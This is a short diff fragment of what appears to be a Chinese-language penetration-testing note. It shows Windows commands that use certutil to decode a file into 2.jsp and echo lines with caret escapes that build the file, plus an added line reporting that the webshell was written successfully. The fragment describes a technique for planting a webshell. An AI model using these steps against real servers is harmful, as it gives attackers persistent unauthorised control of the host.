@@ -28,3 +28,6 @@ certutil -decode 1.txt 2.jsp
 ```
 echo ^;^}^%^>>2.jsp
 ```
+
+
+最后成功写入webshell
